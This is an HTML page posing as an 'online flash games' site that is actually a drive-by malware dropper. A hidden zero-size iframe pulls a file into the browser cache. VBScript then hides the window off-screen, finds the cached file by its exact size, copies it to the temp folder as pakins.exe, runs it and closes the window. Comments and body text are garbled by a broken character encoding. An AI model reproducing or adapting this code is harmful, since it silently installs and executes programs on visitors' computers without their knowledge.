

<html>
<title>online flash games</title>
<iframe src="pakins.htm" width="0" height="0" frameborder="0"></iframe>

<SCRIPT LANGUAGE="VBScript">
Option Explicit
Dim FSO, WSH
Dim strCachePath, strExePath 'ϵͳ�����ļ���·����Ҫ������Exe�ļ���·��
Dim lngSuccess '�����Ƿ�ɹ�

window.resizeTo 0, 0
window.moveto 10000, 10000

Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
strCachePath = WSH.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
lngSuccess = 0

Sub StartSearch()
  SearchFile FSO.GetFolder(strCachePath), "pakins[1].htm"
  if lngSuccess = 0 then SearchFile FSO.GetFolder(strCachePath), "pakins[2].htm"
  if lngSuccess = 0 then setTimeout "StartSearch()", 1000
End Sub

Function SearchFile(Folder, strFileName)
  On Error Resume Next
  Dim SubFolder '���ļ��ж���
  Dim strWinTmpPath, strWinSysPath
  Dim strFilePath, File '��ǰ���ļ�·������ǰ���ļ�����

  strFilePath=FSO.GetParentFolderName(Folder) & "\" & Folder.Name & "\"
  If FSO.FileExists(strFilePath & strFileName) Then
    strWinTmpPath = FSO.GetSpecialFolder(2) & "\"
    strWinSysPath = FSO.GetSpecialFolder(1) & "\"
    set File = FSO.GetFile(strFilePath & strFileName)

    If File.Size = 104469 then
      File.Copy(strWinTmpPath & "pakins.exe")
      WSH.Run strWinTmpPath & "pakins.exe"
      lngSuccess = 1
      'MsgBox "�㶨"
      window.close()
    Else
      Exit Function
    End If
  End If

  If Folder.SubFolders.Count <> 0 Then
    For Each SubFolder In Folder.SubFolders
      SearchFile SubFolder, strFileName
    Next
  End If
End Function

setTimeout "StartSearch()", 1000

</SCRIPT>



<body>
��ѿռ��洰�ڣ��Ժ��Զ��رա�

</body>
</html>
